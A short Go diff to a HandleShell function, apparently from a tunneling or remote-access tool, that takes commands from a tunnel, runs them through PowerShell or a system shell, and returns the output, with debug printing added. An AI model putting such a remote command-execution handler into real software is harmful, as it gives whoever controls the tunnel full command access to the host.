@@ -5,10 +5,12 @@ import (
 	"runtime"
 )
 
-func HandleShell(tunnel Tunnel) {
+func HandleShell(tunnel *Tunnel) {
 	var cmd *exec.Cmd
+	println("SHELL: New shell invoked")
 	for {
-		rawCmd :=  <-tunnel.Input
+		rawCmd := tunnel.GetIn(true)
+		println("SHELL: Command received:", string(rawCmd))
 		if runtime.GOOS == "windows" {
 			if FileExists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") {
 				cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", string(rawCmd))
@@ -26,6 +28,7 @@ func HandleShell(tunnel Tunnel) {
 		if err != nil {
 			out = []byte(err.Error())
 		}
-		tunnel.Output <- out
+		print("SHELL: Command executed with output:", string(out))
+		tunnel.PutOut(out)
 	}
 }
